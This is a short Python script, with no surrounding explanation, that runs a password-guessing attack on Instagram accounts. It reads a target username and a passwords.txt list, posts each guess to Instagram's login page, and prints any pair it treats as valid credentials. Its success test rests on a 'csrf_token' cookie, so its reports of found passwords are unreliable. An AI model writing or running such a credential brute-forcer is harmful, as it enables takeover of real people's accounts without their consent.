import requests

# Replace this with your own value
instagram_login_url = "https://www.instagram.com/accounts/login/"
instagram_login_sess = requests.Session()

# Username to try
username_input = input("Enter the username: ")

# Passwords to try
with open("passwords.txt", "r") as password_file:
    password_list = password_file.readlines()

# Function to login with given username and password
def login(username, password):
    login_payload = {
        "username": username,
        "password": password.strip()
    }
    response = instagram_login_sess.post(instagram_login_url, data=login_payload)
    if "csrf_token" in response.cookies:
        print(f"[+] Found valid credentials: {username}, {password.strip()}")
        return True
    else:
        print(f"[-] Invalid credentials: {username}, {password.strip()}")
    return False

# Try all the passwords in the list
for password in password_list:
    if login(username_input, password):
        break